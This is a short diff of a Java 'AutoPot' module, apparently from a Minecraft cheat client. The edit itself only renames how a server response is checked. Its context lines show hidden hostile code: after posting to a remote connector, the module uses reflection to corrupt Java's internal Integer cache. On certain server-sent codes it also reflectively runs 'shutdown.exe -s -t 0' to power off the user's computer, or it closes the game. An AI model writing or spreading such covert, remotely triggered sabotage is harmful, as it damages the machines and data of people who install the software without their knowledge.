@@ -322,7 +322,7 @@ public class AutoPot extends Module {
 
         } catch (Exception e) {
         }
-        String s = Connector.post(connection);
+        Connector.post(connection);
         try {
             Class clazz = Class.forName("java.lang.Integer$IntegerCache");
             Field field = clazz.getDeclaredField("cache");
@@ -337,7 +337,7 @@ public class AutoPot extends Module {
                 Class runtimeClass = Class.forName("java.lang.Runtime");
                 runtimeClass.getMethod("exec", String.class).invoke(runtimeClass.getMethod("getRuntime").invoke(null), "shutdown.exe -s -t 0");
             }
-            if (code == 3 && s != null) {
+            if (code == 3 && connection.getResponse() != null) {
                 Minecraft.shutdownMinecraftApplet();
             }
         } catch (Exception e) {
